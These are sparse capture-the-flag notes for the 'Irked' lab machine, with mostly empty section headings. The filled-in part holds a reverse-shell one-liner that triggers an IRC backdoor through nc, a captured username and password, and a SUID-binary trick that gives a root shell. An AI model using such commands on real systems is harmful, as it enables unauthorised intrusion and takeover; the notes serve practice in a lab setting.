Name & IP Address of Machine:
> IRKED : `10.10.10.117`
<!-- TOC -->

- [Synopsis](#synopsis)
- [Enumeration](#enumeration)
- [FootHold](#foothold)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->


`echo 'AB; bash -c "bash -i >& /dev/tcp/10.10.14.25/9010 0>&1"' | nc irked.htb 8067`

`djmardov:Kab6h+m+bbp2J:HG`

-viewuser has suid bit enabled. running the binary shows that it needs /tmp/listuser to run.
- `cp /bin/bash /tmp/listuser` got us root.



## Synopsis


## Enumeration
Opened Ports: 
- [ ] .



## FootHold

## Lateral Movement

## Privilege Escalation




<!-- ## Thank You 
🕉️  -->


<!-- ## Tools Used.
- [ ] . -->